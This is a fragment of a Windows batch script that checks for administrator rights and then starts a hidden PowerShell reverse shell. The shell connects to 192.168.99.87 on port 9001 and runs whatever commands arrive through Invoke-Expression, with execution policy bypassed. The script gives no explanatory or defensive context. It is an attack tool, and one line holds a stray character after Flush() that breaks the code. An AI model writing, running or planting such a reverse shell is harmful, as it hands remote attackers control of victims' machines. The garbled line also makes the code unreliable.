...
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" && (
    ...
    echo Access denied. This script requires administrative privileges.
    goto :eof
)

:: Define the PowerShell script inline for the first function
set "psScript1=try { $client = New-Object System.Net.Sockets.TCPClient('192.168.99.87',9001); $stream = $client.GetStream(); $bytes = New-Object byte[] 65536; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i); $sendback = (Invoke-Expression $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '; $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()r; } } catch { Write-Output 'An error occurred: ' + $_.Exception.Message; } finally { $client.Close(); }"

:: Start the first PowerShell script in the background
start "" /b powershell.exe -ExecutionPolicy Bypass -Command "& { %psScript1% }"
